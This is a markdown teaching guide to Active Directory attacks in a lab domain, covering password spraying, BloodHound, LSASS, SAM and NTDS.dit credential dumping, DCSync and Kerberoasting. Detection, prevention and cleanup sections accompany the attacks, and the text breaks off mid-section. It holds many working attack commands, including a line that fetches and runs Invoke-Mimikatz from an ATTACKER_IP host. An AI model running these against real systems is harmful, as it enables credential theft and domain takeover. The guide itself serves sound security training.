# Active Directory Attack Deep Dive

A comprehensive guide to understanding Active Directory attacks - including the concepts, lab setup, root causes, detection/prevention, and alternative techniques.

---

# Lab Environment Overview

## Architecture

```
                    ┌─────────────────────────────────────────┐
                    │          AKATSUKI.LOCAL                 │
                    │           10.10.12.0/24               │
                    └─────────────────────────────────────────┘
                                      │
         ┌────────────────────────────┼────────────────────────────┐
         │                            │                            │
         ▼                            ▼                            ▼
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│      DC01       │         │      WS01       │         │      WS02       │
│  10.10.12.10  │         │  10.10.12.11  │         │  10.10.12.12  │
│  Win Server 2022│         │   Windows 11    │         │   Windows 11    │
│                 │         │                 │         │                 │
│  Domain         │         │  Local Admin:   │         │  Local Admin:   │
│  Controller     │         │  - pain         │         │  - (none*)      │
│                 │         │                 │         │                 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
```

*WS02 has no pre-configured vulnerabilities - set up attacks as needed*

## Domain Users

| Username | Full Name | Password | Role | Notes |
|----------|-----------|----------|------|-------|
| itachi | Itachi Uchiha | `Akatsuki123!` | Domain Admin | Member of Domain Admins |
| pain | Nagato Uzumaki | `Password123!` | Local Admin (WS01) | Standard domain user |
| kisame | Kisame Hoshigaki | `Password123!` | Standard User | Shares password with pain (password spraying) |
| deidara | Deidara | `Explosion789!` | Standard User | Unique password |
| sasori | Sasori | `Puppet456!` | Standard User | Unique password |
| orochimaru | Orochimaru | `Snake2024!` | Low Privilege | Attacker starting point |

## Default Lab State (Clean)

The lab starts in a **hardened default state** - no pre-configured vulnerabilities:

- SMB Signing: Enabled on DC (default)
- Kerberos Pre-auth: Required for all users (default)
- No SPNs on user accounts
- No delegation configured
- No special ACL permissions
- No cached credentials from high-privilege users
- LSA Protection: Not enabled (can be added as hardening)

**Philosophy**: Configure vulnerabilities only when testing specific attacks. This teaches you WHAT makes attacks possible.

---

# Table of Contents

1. [Reconnaissance & Enumeration](#1-reconnaissance--enumeration)
   - [Password Spraying](#11-password-spraying)
   - [BloodHound Enumeration](#12-bloodhound-enumeration)
2. [Credential Harvesting](#2-credential-harvesting)
   - [LSASS Memory Extraction](#21-lsass-memory-extraction)
   - [SAM Database Dump](#22-sam-database-dump)
   - [DCSync Attack](#23-dcsync-attack)
   - [NTDS.dit Extraction](#24-ntdsdit-extraction)
3. [Kerberos Attacks](#3-kerberos-attacks)
   - [Kerberoasting](#31-kerberoasting)
   - [AS-REP Roasting](#32-as-rep-roasting)
   - [Golden Ticket](#33-golden-ticket)
   - [Silver Ticket](#34-silver-ticket)
   - [Diamond Ticket](#35-diamond-ticket)
4. [Lateral Movement](#4-lateral-movement)
   - [Pass-the-Hash (PtH)](#41-pass-the-hash-pth)
   - [Pass-the-Ticket (PtT)](#42-pass-the-ticket-ptt)
   - [Overpass-the-Hash](#43-overpass-the-hash)
   - [Remote Execution Methods](#44-remote-execution-methods)
5. [Delegation Attacks](#5-delegation-attacks)
   - [Unconstrained Delegation](#51-unconstrained-delegation)
   - [Constrained Delegation](#52-constrained-delegation)
   - [Resource-Based Constrained Delegation](#53-resource-based-constrained-delegation-rbcd)
6. [ACL/Permission Abuse](#6-aclpermission-abuse)
7. [NTLM Relay Attacks](#7-ntlm-relay-attacks)
8. [Coercion Attacks](#8-coercion-attacks)
9. [Persistence Techniques](#9-persistence-techniques)
10. [ADCS Attacks](#10-adcs-attacks)

---

# 1. Reconnaissance & Enumeration

## 1.1 Password Spraying

### Concept

Password spraying tests a **single password against many accounts** instead of many passwords against one account. This avoids account lockouts while exploiting password reuse.

```
Traditional Brute Force:          Password Spray:
user1 → pass1, pass2, pass3...    pass1 → user1, user2, user3...
(Triggers lockout)                (Stays below lockout threshold)
```

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Password reuse | Users choose common/similar passwords |
| Weak policies | Passwords like "Summer2024!" meet complexity but are guessable |
| No spray detection | Traditional lockout only tracks per-account failures |
| Large user bases | More users = higher chance someone uses a weak password |

### Lab Setup: Make It Vulnerable

The lab is pre-configured for this attack - pain and kisame share `Password123!`:

```powershell
# Already configured in setup-dc.ps1
# pain and kisame both have: Password123!

# To verify on DC:
Get-ADUser -Filter * -Properties SamAccountName | Select SamAccountName
```

### Attack Methods

#### 🌐 REMOTE (From Kali/Attacker Machine)

**CrackMapExec - SMB Spray**
```bash
# Create user list
echo -e "itachi\npain\nkisame\ndeidara\nsasori\norochimaru" > users.txt

# Single password against all users
crackmapexec smb 10.10.12.10 -u users.txt -p 'Password123!' --continue-on-success

# Multiple common passwords
crackmapexec smb 10.10.12.10 -u users.txt -p passwords.txt --continue-on-success

# WinRM spray
crackmapexec winrm 10.10.12.0/24 -u users.txt -p 'Password123!'

# LDAP spray
crackmapexec ldap 10.10.12.10 -u users.txt -p 'Password123!'
```

**Kerbrute - Kerberos-based (stealthier, no SMB)**
```bash
# Enumerate valid users first (no auth needed!)
kerbrute userenum --dc 10.10.12.10 -d akatsuki.local users.txt

# Password spray via Kerberos
kerbrute passwordspray --dc 10.10.12.10 -d akatsuki.local users.txt 'Password123!'
```

**Hydra - Multi-protocol**
```bash
# RDP spray
hydra -L users.txt -p 'Password123!' rdp://10.10.12.11

# SMB spray
hydra -L users.txt -p 'Password123!' smb://10.10.12.10
```

**Crowbar - RDP specific**
```bash
crowbar -b rdp -s 10.10.12.11/32 -U users.txt -c 'Password123!'
```

#### 💻 LOCAL (With Shell on Domain-Joined Machine)

**DomainPasswordSpray.ps1**
```powershell
# Download: https://github.com/dafthack/DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1

# Spray single password
Invoke-DomainPasswordSpray -Password "Password123!" -OutFile spray-results.txt

# With custom user list
Invoke-DomainPasswordSpray -UserList .\users.txt -Password "Password123!"
```

**Rubeus - Kerberos spray**
```powershell
# Spray via AS-REQ (Kerberos)
Rubeus.exe brute /passwords:passwords.txt /outfile:results.txt
```

**Native PowerShell - Quick test**
```powershell
# Test single credential
$cred = New-Object System.Management.Automation.PSCredential("AKATSUKI\pain", (ConvertTo-SecureString "Password123!" -AsPlainText -Force))
Get-ADUser -Identity pain -Credential $cred  # Success = valid creds
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Event ID 4771 | Kerberos pre-authentication failures (spray pattern) |
| Event ID 4625 | Failed logons from single source to many accounts |
| Pattern analysis | Many failed logons within short time window |
| Source IP | Single IP attempting multiple accounts |

**Detection Logic:**
```
IF count(Event 4625 or 4771) > threshold
AND unique(TargetUserName) > 5
AND time_window < 10 minutes
AND source_ip is same
THEN ALERT "Password Spray Detected"
```

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Smart lockout | Azure AD Smart Lockout / fine-grained lockout policies |
| MFA | Multi-factor authentication blocks sprayed credentials |
| Banned passwords | Azure AD Password Protection / custom dictionaries |
| Spray detection | Microsoft ATA/Defender for Identity |
| Long passwords | 15+ character passphrases |

### Alternative Methods

- **RDP spray**: `crowbar -b rdp -s 10.10.12.11/32 -U users.txt -c 'Password123!'`
- **WinRM spray**: `crackmapexec winrm 10.10.12.0/24 -u users.txt -p pass.txt`
- **LDAP spray**: Custom scripts using ldap3 Python library
- **OWA/Exchange spray**: MailSniper, Ruler

---

## 1.2 BloodHound Enumeration

### Concept

BloodHound maps Active Directory relationships to find attack paths. It collects:
- Users, Groups, Computers
- Sessions (who logged in where)
- ACLs (who has rights over what)
- Trusts between domains

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| AD is queryable | Any domain user can query LDAP |
| Session enumeration | Remote registry / NetSessionEnum leaks who's logged in where |
| Complex permissions | Accumulated permissions create unintended attack paths |

### Lab Setup: Pre-requisites

```powershell
# Minimal requirements - just need any domain user
# Use orochimaru (low priv) to demonstrate

# No special setup needed - BloodHound works out of the box
```

### Attack Methods

#### 🌐 REMOTE (From Kali/Attacker Machine)

**bloodhound-python - Remote collection**
```bash
# Install
pip install bloodhound

# Full collection (requires domain creds)
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -dc dc01.akatsuki.local -c All

# DNS resolution issues? Use IP as nameserver
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c All

# Specific collectors
bloodhound-python -u orochimaru -p 'Snake2024!' -d akatsuki.local -ns 10.10.12.10 -c Group,LocalAdmin,Session

# With NTLM hash instead of password
bloodhound-python -u orochimaru --hashes :NTHASH -d akatsuki.local -ns 10.10.12.10 -c All
```

**ldapdomaindump - Quick LDAP enum**
```bash
# Dump AD via LDAP
ldapdomaindump -u 'akatsuki.local\orochimaru' -p 'Snake2024!' 10.10.12.10 -o ldap_dump/
```

#### 💻 LOCAL (With Shell on Domain-Joined Machine)

**SharpHound.exe - Windows collector**
```powershell
# Download: https://github.com/BloodHoundAD/SharpHound

# Full collection (runs as current user context)
.\SharpHound.exe -c All

# Stealth collection (slower, less noisy)
.\SharpHound.exe -c DCOnly --stealth

# Specific collection methods
.\SharpHound.exe -c Session,LoggedOn    # Just sessions
.\SharpHound.exe -c Group,LocalAdmin    # Groups and local admins
.\SharpHound.exe -c ACL                 # ACL enumeration

# Loop collection (keep collecting sessions)
.\SharpHound.exe -c Session --loop --loopduration 02:00:00
```

**SharpHound.ps1 - PowerShell version**
```powershell
# Import module
Import-Module .\SharpHound.ps1

# Run collection
Invoke-BloodHound -CollectionMethod All
```

**ADRecon - Comprehensive AD report**
```powershell
# Download: https://github.com/adrecon/ADRecon
.\ADRecon.ps1 -OutputDir C:\temp\adrecon
```

#### 📊 Import to BloodHound (On Attacker Machine)

```bash
# Start neo4j database
sudo neo4j console

# Start BloodHound GUI
bloodhound

# Login (default: neo4j/neo4j, change on first login)
# Drag and drop .json/.zip files to import
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| LDAP queries | Unusual LDAP enumeration patterns |
| Event ID 5145 | Access to SYSVOL, NETLOGON shares |
| NetSessionEnum | Remote session enumeration (Event ID 4624 type 3) |
| Remote registry | SAM/LSA remote queries |

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Restrict session enumeration | GPO: Network access: Restrict clients allowed to make remote calls to SAM |
| Tiered admin model | Separate admin accounts per tier |
| Limit ACL complexity | Regular ACL audits, remove unnecessary permissions |
| Deception | Honey accounts that alert on enumeration |

---

# 2. Credential Harvesting

## 2.1 LSASS Memory Extraction

### Concept

LSASS (Local Security Authority Subsystem Service) stores credentials in memory:
- NTLM hashes for SSO
- Kerberos tickets
- Plaintext passwords (if WDigest enabled)

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| SSO requirement | Windows caches credentials for convenience |
| Admin access | Local admin can debug any process |
| WDigest legacy | Older systems store plaintext passwords |
| Memory persistence | Credentials remain until logoff/reboot |

### Lab Setup: Create Cached Credentials

**Step 1: Log in as a high-value user to cache credentials**

```powershell
# On WS02 - RDP or run process as itachi
# Option 1: Interactive RDP login as AKATSUKI\itachi

# Option 2: Run process as itachi (caches creds)
$cred = Get-Credential  # Enter itachi / Akatsuki123!
Start-Process notepad.exe -Credential $cred
```

**Step 2: (Optional) Enable WDigest for plaintext passwords**

```powershell
# On target machine (makes attack more interesting)
# ONLY for lab - reveals plaintext passwords!
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1

# Requires logoff/logon or reboot to take effect
# After re-login, plaintext passwords will be in memory
```

**Step 3: (Optional) Disable LSA Protection for easier extraction**

```powershell
# Check current status
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue

# If enabled, disable for lab (makes extraction easier)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 0
# Requires reboot
```

### Attack Methods

#### 🌐 REMOTE (From Kali - requires admin creds/hash)

**Impacket secretsdump - Remote LSASS dump**
```bash
# With password - dumps SAM, LSA secrets, and cached creds
secretsdump.py AKATSUKI/pain:'Password123!'@10.10.12.21

# With NTLM hash
secretsdump.py -hashes :NTHASH AKATSUKI/pain@10.10.12.21

# Just LSA secrets (includes cached domain creds)
secretsdump.py AKATSUKI/pain:'Password123!'@10.10.12.21 -just-dc-user

# Target specific host, dump everything
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.21
```

**CrackMapExec - Mass credential dump**
```bash
# Dump SAM (local accounts)
crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' --sam

# Dump LSA secrets
crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' --lsa

# Dump LSASS via lsassy module
crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' -M lsassy

# With hash
crackmapexec smb 10.10.12.21 -u pain -H NTHASH --lsa
```

**lsassy - Dedicated LSASS dumper**
```bash
# Remote LSASS dump and parse
lsassy -u pain -p 'Password123!' -d AKATSUKI 10.10.12.21
```

#### 💻 LOCAL (With Admin Shell on Target)

**Mimikatz - In-Memory extraction**
```powershell
# Requires admin/SYSTEM privileges
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    # Dump all credentials
mimikatz # sekurlsa::msv               # Dump NTLM hashes only
mimikatz # sekurlsa::wdigest           # Dump WDigest (plaintext if enabled)
mimikatz # sekurlsa::kerberos          # Dump Kerberos tickets
mimikatz # sekurlsa::credman           # Credential Manager secrets
```

**LSASS Dump Methods (dump file for offline analysis)**
```powershell
# Task Manager (GUI)
# Right-click lsass.exe → Create dump file

# Procdump (Sysinternals - often whitelisted)
procdump.exe -ma lsass.exe C:\temp\lsass.dmp

# comsvcs.dll (LOLBin - Living off the Land)
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\temp\lsass.dmp full

# PowerShell (Out-Minidump from PowerSploit)
Out-Minidump -Process (Get-Process lsass) -DumpFilePath C:\temp\lsass.dmp

# ProcDump clone - MiniDumpWriteDump
.\nanodump.exe --write C:\temp\lsass.dmp
```

**Invoke-Mimikatz - Reflective PowerShell**
```powershell
# Load in memory (no file on disk)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

**SafetyKatz / NanoDump (EDR evasion)**
```powershell
# SafetyKatz - modified mimikatz, dumps in-memory
SafetyKatz.exe

# NanoDump - creates obfuscated minidump
NanoDump.exe --write C:\temp\out.dmp
```

#### 📤 Parse Dump Offline (On Attacker Machine)

```bash
# pypykatz - Pure Python mimikatz (no Windows needed)
pypykatz lsa minidump lsass.dmp

# Mimikatz offline parsing
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| Process Access (Sysmon 10) | Processes reading LSASS memory |
| LSASS Dumps | lsass.dmp file creation |
| Suspicious Tools | mimikatz.exe, procdump.exe accessing lsass |
| Debug Privilege | SeDebugPrivilege being enabled |
| PowerShell | Invoke-Mimikatz, encoded commands |

**Sysmon Configuration:**
```xml
<!-- Log LSASS access -->
<ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
</ProcessAccess>
```

**Event IDs:**
- 4656: Handle requested to LSASS
- 4663: Access attempt on LSASS
- 10 (Sysmon): Process accessed LSASS

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Credential Guard | Isolates LSASS in virtualized container (Win10 Enterprise) |
| LSA Protection | Run LSASS as Protected Process Light (PPL) |
| Disable WDigest | Ensure UseLogonCredential = 0 |
| Reduce cached creds | Limit interactive logons, use network logons |
| EDR | Monitor for LSASS access patterns |

**Enable LSA Protection:**
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1
# Requires reboot
```

### Cleanup: Restore Clean State

```powershell
# Disable WDigest (if enabled)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0

# Clear cached credentials
klist purge

# Log out high-privilege accounts
# Simply log out any itachi sessions
```

---

## 2.2 SAM Database Dump

### Concept

The Security Account Manager (SAM) database stores:
- Local user account password hashes
- Account metadata (SID, last login, etc.)

Location: `C:\Windows\System32\config\SAM` (encrypted with SYSTEM key)

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Local accounts | SAM contains local user hashes |
| Password reuse | Local admin often same across machines |
| Hash persistence | Hashes don't change until password change |
| Offline attack | Can crack hashes without detection |

### Lab Setup: Pre-requisites

```powershell
# SAM attack requires local admin access
# Use: pain on WS01 (already local admin)
# Or: Local vagrant account

# No special setup needed - SAM is always present
```

### Attack Methods

#### 🌐 REMOTE (From Kali - requires local admin creds)

**Impacket secretsdump - Remote SAM dump**
```bash
# Dump SAM remotely (requires local admin on target)
secretsdump.py AKATSUKI/pain:'Password123!'@10.10.12.21

# With hash
secretsdump.py -hashes :NTHASH AKATSUKI/pain@10.10.12.21

# Local account on workstation
secretsdump.py ./Administrator:'LocalPass123'@10.10.12.21
```

**CrackMapExec - SAM dump**
```bash
# Dump SAM from single host
crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' --sam

# Dump SAM from multiple hosts
crackmapexec smb 10.10.12.0/24 -u pain -p 'Password123!' --sam

# Also dump LSA secrets and cached creds
crackmapexec smb 10.10.12.21 -u pain -p 'Password123!' --sam --lsa
```

**reg.py - Remote registry operations**
```bash
# Save SAM remotely (creates files on target, then download)
reg.py AKATSUKI/pain:'Password123!'@10.10.12.21 save -keyName 'HKLM\SAM' -o '\\10.10.12.21\C$\temp\sam'
reg.py AKATSUKI/pain:'Password123!'@10.10.12.21 save -keyName 'HKLM\SYSTEM' -o '\\10.10.12.21\C$\temp\system'
```

#### 💻 LOCAL (With Admin Shell on Target)

**Registry Save Method**
```powershell
# Save registry hives (requires admin)
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save

# Transfer files to attacker machine for offline extraction
```

**Volume Shadow Copy Method**
```powershell
# Create shadow copy (bypasses file locks)
vssadmin create shadow /for=C:

# Find shadow copy name
vssadmin list shadows

# Copy from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
```

**Mimikatz - Direct extraction**
```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**esentutl - Native Windows tool**
```powershell
# Copy locked files using esentutl
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\sam
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\system
```

#### 📤 Parse Dump Offline (On Attacker Machine)

```bash
# Extract hashes from saved files
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# Using pypykatz
pypykatz registry --sam sam.save --system system.save
```

### Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| reg.exe saving SAM/SYSTEM | LAPS for unique local admin passwords |
| VSS creation (Event ID 8222) | Disable local Administrator account |
| Access to SAM file | Credential Guard |
| secretsdump network patterns | Network segmentation |

---

## 2.3 DCSync Attack

### Concept

Domain Controllers replicate data using MS-DRSR protocol. If you have replication rights, you can request password hashes for any user.

```
Attacker with Replication Rights → "I'm a DC, give me password hashes"
                                 → DC complies, returns NTLM hashes
```

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Replication by design | DCs need to sync password hashes |
| Abusable rights | Replication rights grant hash access |
| No user distinction | Protocol doesn't verify requester is actual DC |

### Lab Setup: Make It Vulnerable

**Option A: Use existing Domain Admin (itachi)**

```powershell
# itachi is Domain Admin, already has DCSync rights
# No setup needed - just use itachi's credentials
```

**Option B: Grant DCSync rights to low-privilege user**

```powershell

# Run on DC as Domain Admin
# Grant orochimaru DCSync rights (makes attack possible from low-priv)
Import-Module ActiveDirectory

$user = "orochimaru"
$domain = "DC=akatsuki,DC=local"

# Get user SID
$userSid = (Get-ADUser $user).SID

# Add Replicating Directory Changes
$acl = Get-Acl "AD:\$domain"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $userSid,
    "ExtendedRight",
    "Allow",
    [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
)
$acl.AddAccessRule($ace)

# Add Replicating Directory Changes All
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $userSid,
    "ExtendedRight",
    "Allow",
    [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All
)
$acl.AddAccessRule($ace2)

Set-Acl "AD:\$domain" $acl

Write-Host "Granted DCSync rights to $user" -ForegroundColor Yellow
```

### Attack Methods

#### 🌐 REMOTE (From Kali - requires DCSync rights)

**Impacket secretsdump - DCSync**
```bash
# With password - dump all domain hashes
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10

# With NTLM hash
secretsdump.py -hashes :NTHASH AKATSUKI/itachi@10.10.12.10

# Just NTDS (all users, cleaner output)
secretsdump.py -just-dc AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10

# Just specific user (e.g., krbtgt for Golden Ticket)
secretsdump.py -just-dc-user krbtgt AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10
secretsdump.py -just-dc-user Administrator AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10

# Output to file
secretsdump.py -just-dc AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -outputfile domain_hashes
```

**CrackMapExec - DCSync**
```bash
# Dump NTDS.dit via DCSync
crackmapexec smb 10.10.12.10 -u itachi -p 'Akatsuki123!' --ntds

# With hash
crackmapexec smb 10.10.12.10 -u itachi -H NTHASH --ntds

# Dump specific user only
crackmapexec smb 10.10.12.10 -u itachi -p 'Akatsuki123!' --ntds --user krbtgt
```

**NetExec (updated CME)**
```bash
netexec smb 10.10.12.10 -u itachi -p 'Akatsuki123!' --ntds
```

#### 💻 LOCAL (With Shell on Domain-Joined Machine)

**Mimikatz - DCSync**
```powershell
# DCSync specific user (requires domain user context with DCSync rights)
mimikatz # lsadump::dcsync /user:AKATSUKI\Administrator

# DCSync krbtgt (for Golden Ticket)
mimikatz # lsadump::dcsync /user:AKATSUKI\krbtgt

# DCSync all users (takes time)
mimikatz # lsadump::dcsync /all /csv

# Specify domain and DC
mimikatz # lsadump::dcsync /user:Administrator /domain:akatsuki.local /dc:dc01.akatsuki.local
```

**SharpKatz - C# Mimikatz**
```powershell
# DCSync via SharpKatz
SharpKatz.exe --Command dcsync --User Administrator --Domain akatsuki.local --DomainController dc01.akatsuki.local
```

**DSInternals PowerShell Module**
```powershell
# Install module
Install-Module DSInternals -Force

# Get specific user hash
Get-ADReplAccount -SamAccountName Administrator -Server dc01.akatsuki.local

# Get krbtgt hash
Get-ADReplAccount -SamAccountName krbtgt -Server dc01.akatsuki.local
```

### Blue Team: Detection

| Event ID | Description |
|----------|-------------|
| 4662 | Directory Service Access (look for Replicating Directory Changes) |
| 4624 | Logon from unusual source making replication requests |

**Detection Logic:**
```
IF (Event 4662)
AND (Properties contains "Replicating Directory Changes")
AND (SubjectUserName NOT IN domain_controllers)
THEN ALERT "Potential DCSync Attack"
```

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Limit replication rights | Audit who has these rights, remove if unnecessary |
| Protected Users group | Add sensitive accounts |
| Monitor privileged groups | Alert on changes to Domain Admins |
| Network segmentation | Limit what can talk to DC on replication ports |

**Find accounts with DCSync rights:**
```powershell
Import-Module ActiveDirectory
$domain = (Get-ADDomain).DistinguishedName

(Get-Acl "AD:\$domain").Access | Where-Object {
    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or
    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
} | Select IdentityReference
```

### Cleanup: Remove Vulnerability

```powershell
# Remove DCSync rights from orochimaru
$user = "orochimaru"
$domain = "DC=akatsuki,DC=local"
$userSid = (Get-ADUser $user).SID

$acl = Get-Acl "AD:\$domain"
$acl.Access | Where-Object { $_.IdentityReference -match $user } | ForEach-Object {
    $acl.RemoveAccessRule($_)
}
Set-Acl "AD:\$domain" $acl
```

---

## 2.4 NTDS.dit Extraction

### Concept

`NTDS.dit` is the Active Directory database file containing all domain objects and password hashes. Unlike DCSync, this is file-based.

Location: `C:\Windows\NTDS\ntds.dit` (on DCs only)

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Centralized storage | All hashes in one file |
| File-based | Can extract offline without network |
| Volume shadow copies | Bypass file locks |

### Lab Setup: Pre-requisites

```powershell
# Requires admin access on Domain Controller
# Use: AKATSUKI\itachi or local Administrator

# No special setup needed - NTDS.dit is always present
```

### Attack Methods

#### 🌐 REMOTE (From Kali - requires DC admin creds)

```bash
# secretsdump.py can extract NTDS.dit remotely via DRSUAPI (DCSync)
# This is preferred over file extraction
secretsdump.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10 -just-dc

# If you have file access via SMB, download after local extraction
smbclient.py AKATSUKI/itachi:'Akatsuki123!'@10.10.12.10
# smb: \> get C:\temp\ntds.dit
# smb: \> get C:\temp\SYSTEM

# CrackMapExec - one-liner DCSync
crackmapexec smb 10.10.12.10 -u itachi -p 'Akatsuki123!' --ntds

# Extract from downloaded files
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

#### 💻 LOCAL (With Admin Shell on DC)

**Method 1: VSS Shadow Copy**
```powershell
# On the DC (requires admin)
vssadmin create shadow /for=C:

# Copy files
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

**Method 2: ntdsutil**
```powershell
# Create IFM (Install From Media) backup
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntdsutil" quit quit

# Files in: C:\temp\ntdsutil\Active Directory\ntds.dit
#           C:\temp\ntdsutil\registry\SYSTEM
```

**Method 3: diskshadow**
```powershell
# Create script
$script = @"
set context persistent nowriters
add volume c: alias myalias
create
expose %myalias% z:
"@
$script | Out-File C:\temp\shadow.txt

# Execute
diskshadow /s C:\temp\shadow.txt

# Copy from Z:\
copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

**Method 4: NinjaCopy (PowerShell)**
```powershell
# Bypasses file locks without VSS
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\temp\ntds.dit"
```

**Method 5: Mimikatz DCSync (local execution)**
```powershell
# DCSync from DC itself
mimikatz # lsadump::dcsync /all /csv
```

#### 📤 Parse Dump Offline (On Attacker Machine)

```bash
# Extract hashes from downloaded files
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Using pypykatz
pypykatz registry --sam sam --system system --ntds ntds.dit
```

### Blue Team: Detection & Prevention

| Detection | Prevention |
|-----------|------------|
| VSS creation (Event ID 8222) | Limit admin access on DCs |
| ntdsutil/diskshadow execution | Monitor for suspicious file copies |
| Large file copies from DC | Backup integrity monitoring |
| Shadow copy access | EDR on Domain Controllers |

---

# 3. Kerberos Attacks

## Understanding Kerberos First

### How Kerberos Authentication Works

```
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Client  │         │   KDC    │         │ Service  │
│ (User)   │         │  (DC)    │         │ (Server) │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │ 1. AS-REQ          │                    │
     │ (username +        │                    │
     │  encrypted         │                    │
     │  timestamp)        │                    │
     │───────────────────>│                    │
     │                    │                    │
     │ 2. AS-REP          │                    │
     │ (TGT encrypted     │                    │
     │  with krbtgt hash) │                    │
     │<───────────────────│                    │
     │                    │                    │
     │ 3. TGS-REQ         │                    │
     │ (TGT + SPN)        │                    │
     │───────────────────>│                    │
     │                    │                    │
     │ 4. TGS-REP         │                    │
     │ (Service Ticket    │                    │
     │  encrypted with    │                    │
     │  service acct hash)│                    │
     │<───────────────────│                    │
     │                    │                    │
     │ 5. AP-REQ (Service Ticket)              │
     │────────────────────────────────────────>│
```

**Key Points:**
- **TGT (Ticket Granting Ticket)**: Encrypted with krbtgt hash, proves identity
- **TGS (Service Ticket)**: Encrypted with service account hash, grants access
- **krbtgt**: Special account whose hash encrypts all TGTs

---

## 3.1 Kerberoasting

### Concept

Any domain user can request a service ticket for any SPN. The ticket is encrypted with the service account's password hash - crack it offline!

```
Attacker → Request TGS for MSSQLSvc/server → Get encrypted ticket → Crack offline
```

### Root Cause: Why This Works

| Factor | Description |
|--------|-------------|
| Any user can request tickets | No restrictions on TGS requests |
| Weak service passwords | Service accounts often have guessable passwords |
| Offline cracking | No lockout, no detection |
| RC4 encryption | Fast to crack compared to AES |

### Lab Setup: Make It Vulnerable

**Step 1: Create a service account with SPN**

```powershell
# Run on DC as Domain Admin

# Create service account
$password = ConvertTo-SecureString "SQLServicePass123!" -AsPlainText -Force
New-ADUser -Name "svc_sql" `
    -SamAccountName "svc_sql" `
    -UserPrincipalName "svc_sql@akatsuki.local" `
    -Description "SQL Service Account - Kerberoastable" `
    -Path "OU=Shinobi,DC=akatsuki,DC=local" `
    -AccountPassword $password `
    -Enabled $true `
    -PasswordNeverExpires $true

# Set SPN (makes it Kerberoastable)
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/dc01.akatsuki.local:1433"}

# Verify
